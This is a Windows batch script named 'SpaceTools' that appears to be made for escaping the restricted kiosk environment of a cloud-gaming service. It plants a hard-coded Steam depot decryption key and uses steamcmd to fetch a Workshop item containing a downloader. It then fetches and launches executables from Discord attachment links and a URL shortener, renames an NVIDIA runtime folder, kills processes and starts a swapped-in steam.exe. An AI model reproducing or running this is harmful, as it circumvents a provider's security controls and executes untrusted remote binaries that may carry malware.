@ECHO OFF 
COLOR 
TITLE SpaceTools, Thanks to weinforce team for method
C: 
CD "C:\Program Files (x86)\Steam" 
SETLOCAL
CALL :setESC
:MAIN
MD "B:\Space" >NUL 2>&1

cd\
ECHO "InstallConfigStore"{"Software"{"Valve"{"steam"{"depots"{"382490"{"DecryptionKey" "862e956521df2d7593e26b0401a13c1b574d118abd47cf701962302eb5130451"}}}}}} > "C:\Program Files (x86)\NVIDIA_Grid_Bundle\steamworks_common_redistributables\steamcmd\config\config.vdf"
REM passing workshop_download_item directly will crash session
(echo workshop_download_item 382490 2286097686 && echo. && echo quit && echo.)|clip
ECHO %ESC%[46mPush Control + V In Steamcmd And Wait%ESC%[0m
START "" "C:\Program Files (x86)\NVIDIA_Grid_Bundle\steamworks_common_redistributables\steamcmd\steamcmd.exe" +force_install_dir "C:/Program Files (x86)/Steam/steamapps/common/Steamworks Shared/_CommonRedist/" +login anonymous
:loop
IF EXIST "C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\steamapps\workshop\content\382490\2286097686\downloader.exe" GOTO :hello:
goto loop


:hello
SET DL="C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\steamapps\workshop\content\382490\2286097686\downloader.exe"
B:
cd\
cd Space
%DL% -LJOk "https://cdn.discordapp.com/attachments/789457246189781054/794058754176974888/SpaceToolBetaV2.1.exe"
START "" "B:\Space\SpaceToolBetaV2.1.exe"

C:
cd\
START "" "C:\Program Files (x86)\Steam\_steam_installer\SteamSetup.exe"
tskill steam
cd\
REN "C:\Users\kiosk\AppData\Local\NVIDIA Corporation\GfnRuntimeSdk" UsgxDDD
cd\
cd Program Files (x86)
cd Steam
cd steamapps
cd shadercache
%DL% -LJOk http://gg.gg/steamoldexe"
start steam.exe.old
B:
cd\
md Usg
cd Usg
%DL% -LJOk "https://cdn.discordapp.com/attachments/741059833163153469/763423169230667816/steam.exe"
TSKILL SteamSetup
START "" "B:\Usg\steam.exe"

exit







:setESC
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
)
GOTO :MAIN